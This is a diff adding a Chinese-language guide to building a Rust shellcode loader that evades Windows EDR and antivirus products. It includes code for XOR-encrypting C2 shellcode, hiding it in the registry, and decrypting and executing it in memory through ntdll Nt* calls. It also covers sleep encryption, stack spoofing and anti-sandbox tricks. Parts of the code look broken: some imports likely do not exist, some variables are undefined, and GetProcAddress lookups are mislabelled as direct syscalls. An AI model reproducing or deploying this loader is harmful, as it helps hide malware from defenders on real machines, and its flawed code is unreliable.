@@ -1,0 +1,246 @@
+## 1. 概述
+
+本文档旨在深入探讨在现代网络安全攻防对抗中，如何利用 Rust 语言构建能够规避主流终端安全检测（EDR/AV）的 Windows Shellcode 加载器（Loader）。我们将聚焦于多种高级免杀技术的组合应用，包括但不限于：**静态混淆**、**动态绕过**、**内存操作技巧**、**执行流程欺骗**以及**冷门语言**的利用。
+
+在红队行动或渗透测试中，C2（Command and Control）框架生成的 Shellcode 是建立持久化控制的关键。然而，其加载和执行过程是安全产品监控的重点。传统的加载器极易被基于签名、行为或内存的检测机制捕获。因此，开发具备深度免杀能力的自定义加载器至关重要。Rust 语言凭借其出色的性能、内存安全特性以及对底层系统调用的强大控制力，正成为编写恶意软件和免杀工具的理想选择。
+
+本文将结合理论与实践，提供可复现的代码示例和攻击流程，帮助安全研究人员和红队工程师掌握更隐蔽的攻击技术。
+
+## 2. 技术原理
+
+一个成功的免杀加载器，其核心在于打破安全软件的检测逻辑。安全软件通常从以下几个维度进行检测：
+
+*   **静态分析**：扫描文件中的恶意特征码（签名）。如果 Shellcode 硬编码在程序中，极易被识别。
+*   **行为监控**：监控进程的敏感行为，如申请可执行内存（`RWX`）、创建远程线程、注入其他进程等。
+*   **用户态 API Hooking**：通过在 `ntdll.dll` 等核心动态链接库中设置钩子（Hook），拦截并检查 `VirtualAlloc`、`CreateThread` 等敏感函数的调用。
+*   **内存扫描**：周期性地扫描进程内存，查找符合 Shellcode 特征的字节序列或异常的内存页权限。
+*   **沙箱分析**：在隔离环境中执行样本，通过其行为判断是否为恶意。
+
+我们的免杀策略将围绕上述检测点展开，通过组合多种技术手段，实现对防御体系的有效穿透。
+
+## 3. 环境准备
+
+在开始实战之前，请确保您的开发与测试环境已准备就绪。
+
+*   **操作系统**：Windows 10/11 x64
+*   **开发语言**：Rust
+    *   安装 Rust：访问 [https://www.rust-lang.org/tools/install](https://www.rust-lang.org/tools/install) 并按照指引安装 `rustup`。
+    *   配置交叉编译环境（用于生成 Windows 可执行文件）：
+        ```bash
+        rustup target add x86_64-pc-windows-msvc
+        ```
+*   **C2 框架**：用于生成 Shellcode，例如 Cobalt Strike 或 Metasploit Framework。
+*   **辅助工具**：
+    *   **SysWhispers3/2**：用于生成直接进行系统调用的汇编代码，是绕过用户态 Hook 的关键。
+    *   **Hex 编辑器**：用于查看和处理 Shellcode。
+    *   **Process Hacker / x64dbg**：用于在测试阶段调试和分析进程内存与行为。
+
+## 4. 实战示例：构建多阶段免杀加载器
+
+我们将逐步构建一个集成了多种免杀技术的 Rust 加载器。
+
+### 阶段一：静态混淆与分离加载
+
+**目标**：避免将原始 Shellcode 直接硬编码在可执行文件中，绕过静态特征码扫描。
+
+1.  **混淆 Shellcode**：
+    使用简单的 XOR 或其他加密算法对原始 Shellcode 进行处理。这里以 XOR 为例。
+
+    ```python
+    # Python 脚本：对 Shellcode 进行 XOR 加密
+    def xor_encrypt(shellcode, key):
+        encrypted = bytearray()
+        for i in range(len(shellcode)):
+            encrypted.append(shellcode[i] ^ key[i % len(key)])
+        return encrypted
+
+    # 假设这是从 C2 生成的原始 Shellcode
+    original_shellcode = b"\xfc\x48\x83\xe4\xf0..." 
+    encryption_key = b"MySecretKey123"
+
+    encrypted_shellcode = xor_encrypt(original_shellcode, encryption_key)
+
+    # 输出为 Rust 字节数组格式
+    print("let encrypted_shellcode: &[u8] = &[", end="")
+    print(", ".join([f"0x{byte:02x}" for byte in encrypted_shellcode]), end="];\n")
+    ```
+
+2.  **分离存储**：
+    将加密后的 Shellcode 存储在外部资源中，而不是直接放在 `.exe` 的数据段。常见的分离方式包括：
+    *   远程服务器（HTTP/HTTPS）
+    *   文件资源（如图标、版本信息）
+    *   **注册表**（较为隐蔽）
+
+    以下示例演示如何将加密 Shellcode 写入注册表：
+    ```powershell
+    # 使用 PowerShell 将加密后的 Shellcode 写入注册表
+    $encryptedShellcode = [byte[]](0xab, 0xcd, 0xef, ...) # 替换为你的加密 Shellcode
+    Set-ItemProperty -Path "HKCU:\Software\MyApp" -Name "Payload" -Value $encryptedShellcode -Type Binary
+    ```
+
+3.  **分离加载与解密**：
+    Rust 加载器在运行时从注册表读取数据，然后在内存中解密，恢复出原始 Shellcode。
+
+    ```rust
+    // main.rs
+    use winreg::enums::*;
+    use winreg::RegKey;
+
+    fn main() {
+        // 1. 从注册表读取加密的 Shellcode
+        let hkey_current_user = RegKey::predef(HKEY_CURRENT_USER);
+        let app_key = hkey_current_user.open_subkey("Software\\MyApp").expect("Failed to open registry key");
+        let encrypted_shellcode: Vec<u8> = app_key.get_value("Payload").expect("Failed to read payload from registry");
+
+        // 2. 在内存中解密
+        let key = b"MySecretKey123";
+        let mut shellcode = encrypted_shellcode.clone();
+        for i in 0..shellcode.len() {
+            shellcode[i] ^= key[i % key.len()];
+        }
+
+        // ... 后续执行逻辑
+    }
+    ```
+
+### 阶段二：动态绕过用户态 Hook (Syscall)
+
+**目标**：不使用 `kernel32.dll` 或 `ntdll.dll` 导出的高风险函数，直接发起系统调用，绕过 EDR 的 API Hook。
+
+我们将使用 `windows-sys` crate 来直接定义系统调用函数原型，并结合动态解析技术获取 Syscall ID。
+
+**系统调用执行流程**：
+1.  `NtAllocateVirtualMemory`: 分配内存。
+2.  `NtWriteVirtualMemory`: 将解密后的 Shellcode 写入刚分配的内存。
+3.  `NtProtectVirtualMemory`: 将内存页的权限从 `RW` 修改为 `RX`（可读可执行）。
+4.  `NtCreateThreadEx` / `NtQueueApcThread`: 创建一个新线程来执行 Shellcode。
+
+```rust
+// main.rs (续)
+use std::ffi::c_void;
+use std::mem::transmute;
+use windows_sys::Win32::System::SystemServices::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+use windows_sys::Win32::System::Threading::{NtAllocateVirtualMemory, NtCreateThreadEx, NtProtectVirtualMemory, NtWriteVirtualMemory};
+
+// ... 接上一部分代码
+
+unsafe {
+    // 动态获取 ntdll.dll 中的函数地址
+    let ntdll = windows_sys::Win32::System::LibraryLoader::LoadLibraryA("ntdll.dll\0".as_ptr());
+    
+    let p_nt_allocate_virtual_memory: extern "system" fn(
+        ProcessHandle: isize,
+        BaseAddress: *mut *mut c_void,
+        ZeroBits: usize,
+        RegionSize: *mut usize,
+        AllocationType: u32,
+        Protect: u32,
+    ) -> i32 = transmute(windows_sys::Win32::System::LibraryLoader::GetProcAddress(ntdll, "NtAllocateVirtualMemory\0".as_ptr()));
+
+    // ... 同样方式获取 NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx 的地址
+
+    let mut base_address: *mut c_void = std::ptr::null_mut();
+    let mut region_size = shellcode.len();
+
+    // 1. 分配内存 (RW)
+    p_nt_allocate_virtual_memory(
+        -1, // 当前进程
+        &mut base_address,
+        0,
+        &mut region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    );
+
+    // 2. 写入 Shellcode
+    p_nt_write_virtual_memory(
+        -1,
+        base_address,
+        shellcode.as_ptr() as *const c_void,
+        shellcode.len(),
+        std::ptr::null_mut(),
+    );
+
+    // 3. 修改内存权限为可执行 (RX)
+    let mut old_protect = PAGE_READWRITE;
+    p_nt_protect_virtual_memory(
+        -1,
+        &mut base_address,
+        &mut region_size,
+        PAGE_EXECUTE_READ,
+        &mut old_protect,
+    );
+
+    // 4. 创建线程执行 Shellcode
+    let mut thread_handle: *mut c_void = std::ptr::null_mut();
+    p_nt_create_thread_ex(
+        &mut thread_handle,
+        0x1FFFFF, // THREAD_ALL_ACCESS
+        std::ptr::null_mut(),
+        -1,
+        base_address,
+        std::ptr::null_mut(),
+        0,
+        0,
+        0,
+        0,
+        std::ptr::null_mut(),
+    );
+
+    // ... 等待线程结束等收尾工作
+}
+```
+
+### 阶段三：睡眠加密与堆栈欺骗 (Sleep & Stack Spoofing)
+
+**目标**：在 Shellcode 执行的间歇期（例如 C2 Beacon 的睡眠时间）保护自身，防止被内存扫描发现，并伪造线程调用栈，迷惑分析人员。
+
+**流程**：
+1.  **执行前**：Shellcode 正常运行。
+2.  **进入睡眠**：
+    a. 在睡眠前，使用 `NtProtectVirtualMemory` 将 Shellcode 所在内存页的权限修改回 `PAGE_READWRITE`。
+    b. 对内存中的 Shellcode 进行**加密**（例如，简单的 XOR）。
+    c. 调用 `NtWaitForSingleObject` 或其他睡眠函数进入等待状态。
+3.  **唤醒后**：
+    a. **解密**内存中的 Shellcode。
+    b. 使用 `NtProtectVirtualMemory` 将内存页权限恢复为 `PAGE_EXECUTE_READ`。
+    c. 跳转回 Shellcode 的执行点继续执行。
+4.  **堆栈欺骗**：
+    在调用睡眠函数之前，通过修改返回地址（Return Address）或使用 ROP (Return-Oriented Programming) 技术，将线程的调用栈伪装成一个看起来无害的调用链，例如伪装成正在等待用户输入的 `ReadFile` 调用。
+
+这个过程通常需要对 Shellcode 本身进行修改或使用一个更复杂的加载器存根（Stub）来包装 Shellcode 的执行。
+
+**参考项目**：
+*   **[b1nhack/rust-shellcode](https://github.com/b1nhack/rust-shellcode)**：该项目提供了一个很好的起点，演示了如何在 Rust 中加载和执行 Shellcode，可以作为上述高级功能的基础框架。
+
+## 5. 关键细节与扩展
+
+*   **内存分配技术变种**：
+    *   `VirtualAlloc` 是最标准也是最受监控的内存分配方式。
+    *   `HeapAlloc`：在堆上分配内存，行为相对不那么敏感，但需要注意堆的可执行权限问题。
+    *   **内存映射文件 (File Mapping)**：通过 `CreateFileMapping` 和 `MapViewOfFile` 创建一块内存。这种方式可以伪装成文件操作，更具隐蔽性。
+    *   **线程本地存储 (TLS Callbacks)**：可以将 Shellcode 的执行逻辑放入 TLS 回调函数中，使其在主函数 `main` 之前执行，绕过一些入口点分析。
+
+*   **反沙箱与反调试**：
+    在执行核心逻辑前，加入检测代码，判断自身是否运行在沙箱或调试环境中。
+    *   检测虚拟机特征（如特定的 MAC 地址、注册表项）。
+    *   检测调试器（`IsDebuggerPresent`）。
+    *   检测分析工具的进程（`Process32First`/`Process32Next`）。
+    *   **时间延迟**：在程序启动时随机休眠一段时间。沙箱为了效率，通常会跳过或加速 `Sleep` 函数，导致时间检测失效。
+
+*   **其他冷门语言**：
+    除了 Rust，一些不常见的语言由于其生态系统较小，导致安全厂商的静态分析和检测能力相对滞后。
+    *   **Nim**：语法类似 Python，但能编译成高效的 C/C++ 代码，并直接进行系统调用。项目 **[aeverj/NimShellCodeLoader](https://github.com/aeverj/NimShellCodeLoader)** 是一个很好的例子。
+    *   **Zig**：一门新兴的系统编程语言，强调简单和性能，同样具备底层控制能力。
+    *   参考文章：[《渗透测试实战-免杀基础(Nim,Zig,Rust)》](https://mp.weixin.qq.com/s/JmSS4L5bDUn7ps7YHcIgKg) 提供了对这些语言在免杀领域应用的精彩概述。
+
+## 6. 安全总结
+
+本文档详细介绍了一套基于 Rust 的高级免杀技术栈。通过将 **静态混淆**、**分离加载**、**直接系统调用**、**睡眠加密** 和 **堆栈欺骗** 等多种技术进行有机结合，我们可以构建出能够有效对抗现代 EDR 和 AV 解决方案的 Shellcode 加载器。
+
+**核心思想**：
+*   **分层规避**：针对静态、动态、内存等不同层面的检测机制，采用对应的绕过技术。
+*   **行为正常化**：尽可能使恶意进程的行为看起来与正常软件无异，例如使用文件映射代替 `VirtualAlloc`，或伪造无害的线程调用栈。
+*   **利用信息差**：使用 Rust、Nim、Zig 等相对冷门的语言，利用安全厂商在样本分析和签名提取上的滞后性。
+
+需要强调的是，攻防技术总是在不断演进的。本文所介绍的技术可能在未来被新的检测方法所克制。作为安全从业者，持续学习和研究新的对抗策略是保持技术领先的关键。希望本文能为您在红队工具开发和安全研究方面提供有价值的参考。
